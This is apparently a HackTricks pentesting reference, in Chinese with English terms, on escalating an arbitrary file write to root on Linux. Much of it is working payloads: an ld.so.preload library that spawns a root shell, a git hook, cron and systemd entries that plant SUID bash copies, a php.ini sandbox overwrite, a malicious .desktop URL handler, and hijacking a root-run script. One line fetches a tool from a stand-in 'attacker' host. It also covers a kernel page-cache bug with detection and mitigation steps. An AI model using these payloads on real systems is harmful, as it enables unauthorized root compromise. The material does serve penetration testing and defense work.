# 任意文件写入到 Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

这个文件的行为类似于 **`LD_PRELOAD`** 环境变量，但它也适用于 **SUID binaries**。\
如果你可以创建它或修改它，你只需添加一个**将被加载的 library 路径**，这样每次执行二进制文件时都会加载它。

例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) 是在 git 仓库中的各种 **事件** 上**运行**的 **scripts**，比如创建 commit、merge 时……所以如果一个**特权脚本或用户**经常执行这些操作，并且有可能**写入 `.git` folder**，这就可以用来进行 **privesc**。

例如，可以在 git repo 的 **`.git/hooks`** 中**生成一个 script**，这样每次创建新 commit 时它都会被执行：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

如果你可以**写入 root 执行的 cron 相关文件**，通常在下次任务运行时就能获得代码执行。值得关注的目标包括：

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- root 自己的 crontab，位于 `/var/spool/cron/` 或 `/var/spool/cron/crontabs/`
- `systemd` timers 以及它们触发的 services

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的滥用路径：

- **向 `/etc/crontab` 或 `/etc/cron.d/` 中的文件追加一个新的 root cron job**
- **替换一个已经被 `run-parts` 执行的脚本**
- **通过修改它启动的脚本或二进制文件来植入后门到现有的 timer target**

最小 cron payload 示例：
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
如果你只能写入 `run-parts` 使用的 cron 目录，那就改为在那里放一个可执行文件：
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` 通常会忽略包含点的文件名，所以优先使用 `backup` 之类的名称，而不是 `backup.sh`。
- 一些发行版使用 `anacron` 或 `systemd` timers 代替经典的 cron，但滥用思路是相同的：**修改 root 之后会执行的内容**。

### Service & Socket files

如果你可以写入 **`systemd` unit files** 或它们引用的文件，你可能可以通过重新加载并重启该 unit，或者等待 service/socket 的激活路径触发，从而以 root 获取 code execution。

有趣的目标包括：

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 中的 drop-in overrides
- `ExecStart=`、`ExecStartPre=`、`ExecStartPost=` 引用的 service scripts/binaries
- 被 root service 加载的可写 `EnvironmentFile=` 路径

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
常见滥用路径：

- **覆盖 `ExecStart=`** 在一个你可以修改的 root 拥有的 service unit 中
- **添加一个 drop-in override**，使用恶意的 `ExecStart=`，并先清除旧的那个
- **植入后门到 script/binary**，即 unit 已经引用的那个
- **劫持一个 socket-activated service**，通过修改对应的 `.service` 文件；当 socket 接收到连接时会启动该文件

恶意 override 示例：
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的激活流程：
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
如果你不能自己重启服务，但可以编辑一个 socket-activated 单元，那么你可能只需要**等待客户端连接**，就能触发被植入后门的服务以 root 身份执行。

### 覆盖一个被特权 PHP sandbox 使用的受限 `php.ini`

一些自定义 daemon 会通过运行带有**受限 `php.ini`** 的 `php` 来验证用户提供的 PHP（例如，`disable_functions=exec,system,...`）。如果 sandboxed 代码仍然拥有**任何写入原语**（例如 `file_put_contents`），并且你可以访问 daemon 使用的**精确 `php.ini` 路径**，你就可以**覆盖该配置**来解除限制，然后再提交一个以提升后的权限运行的第二个 payload。

典型流程：

1. 第一个 payload 覆盖 sandbox 配置。
2. 第二个 payload 在危险函数重新启用后执行代码。

最小示例（替换为 daemon 使用的路径）：
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
如果 daemon 以 root 运行（或使用 root-owned paths 进行校验），第二次执行会获得 root context。本质上，这是在 sandboxed runtime 仍然可以写入文件时的 **privilege escalation via config overwrite**。

### binfmt_misc

位于 `/proc/sys/fs/binfmt_misc` 的文件指示哪种 binary 应该执行哪种类型的文件。TODO: 检查滥用它在打开常见文件类型时执行 rev shell 的要求。

### Overwrite schema handlers (like http: or https:)

攻击者如果拥有对受害者 configuration directories 的写权限，就可以轻易替换或创建会改变系统行为的文件，从而导致非预期的 code execution。通过修改 `$HOME/.config/mimeapps.list` 文件，将 HTTP 和 HTTPS URL handlers 指向恶意文件（例如设置 `x-scheme-handler/http=evil.desktop`），攻击者就能确保 **点击任何 http 或 https 链接都会触发 `evil.desktop` 文件中指定的代码**。例如，在 `$HOME/.local/share/applications` 中放置下面的恶意代码到 `evil.desktop` 后，任何外部 URL 点击都会运行其中嵌入的命令：
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root executing user-writable scripts/binaries

If a privileged workflow runs something like `/bin/sh /home/username/.../script` (or any binary inside a directory owned by an unprivileged user), you can hijack it:

- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **确认可写性：** 确保目标文件及其所在目录都归你用户所有且可写。
- **劫持目标：** 备份原始 binary/script，并放置一个 payload，用于创建一个 SUID shell（或执行任何其他 root 操作），然后恢复权限：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action**（例如，按下一个会启动 helper 的 UI 按钮）。当 root 重新执行被劫持的 path 时，用 `./rootshell -p` 抓取提权后的 shell。

### 仅修改特权二进制文件的 page-cache

一些 kernel bug 不会修改磁盘上的 file。相反，它们只允许你修改一个可读 file 的 **page cache copy**。如果你能针对一个 **setuid** 或其他由 **root 执行** 的 binary，下一次执行时可能会从 memory 中运行 attacker-controlled bytes，从而提权，尽管磁盘上的 file hash 没有变化。

可以把这理解为一种 **runtime-only file write primitive**：

- **Disk stays clean**：inode 和磁盘上的 bytes 不会改变
- **Memory is dirty**：读取/执行缓存页的进程会拿到 attacker-modified 内容
- **Effect is temporary**：重启或 cache eviction 后，改动会消失

这种 primitive 介于经典的 **arbitrary file write** 和更早的 **page-cache abuse** 漏洞（如 Dirty COW / Dirty Pipe）之间：

- Dirty COW 依赖 race
- Dirty Pipe 有写入位置限制
- 如果 vulnerable path 直接向缓存的 file-backed pages 写入，page-cache-only primitive 可能更可靠

#### Generic privesc flow

1. 获取一个可以写入 **file-backed page cache pages** 的 kernel primitive
2. 将其用于一个 **可读的特权 binary** 或其他 root-executed file
3. 在 page 被从 cache 中逐出前触发执行
4. 在磁盘上的 file 看起来仍未被修改时，获得 root 下的 code execution

典型的高价值目标：

- **setuid-root** binaries
- 由 **root services** 启动的 helpers
- 通常在 **containers sharing the host kernel/page cache** 中执行的 binaries

#### AF_ALG + `splice()` 示例路径

Copy Fail (CVE-2026-31431) 就是这类问题的一个好例子。vulnerable path 位于 Linux crypto userspace API（`AF_ALG` / `algif_aead`）：

- `splice()` 可以把来自可读 file 的 page-cache pages 引用移动到 crypto TX scatterlist 中
- in-place 的 `algif_aead` decrypt path 复用了 source 和 destination buffers
- 然后 `authencesn` 向 destination tag region 写入
- 当该 region 仍然引用被 splice 的 file-backed pages 时，这次写入就落到了目标 file 的 **page cache** 中

所以真正有意思的不是 CVE 本身，而是这种模式：

- **把 file-backed cache pages 输入到 kernel subsystem**
- 让 subsystem **把它们当作可写输出**
- 在 memory 中触发一次小而可控的 overwrite

公开的 PoC 使用重复的 **4-byte writes** 在 memory 中修补 `/usr/bin/su`，然后执行它。

#### Exposure and hunting

如果你怀疑存在这类 bug，不要只依赖磁盘完整性检查。也要验证：
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` 可能作为模块可加载/可卸载
- `CONFIG_CRYPTO_USER_API_AEAD=y`: 该接口内置于 kernel 中
- setuid binaries 是很好的目标，因为仅修改 page cache 的 patch 就足以把本地 foothold 转成 root

#### `algif_aead` 路径的 attack-surface reduction

如果 vulnerable interface 由可加载模块提供：
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
如果它被编译进 kernel，一些 disclosures 报告称通过以下方式阻止 init 路径：
```bash
initcall_blacklist=algif_aead_init
```
这种缓解措施也值得记住在其他 kernel LPEs 上：如果 exploitation 依赖于某个特定的可选接口，那么禁用或拉黑该接口，即使在完整的 kernel 升级尚不可用之前，也能破坏 exploit 路径。

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
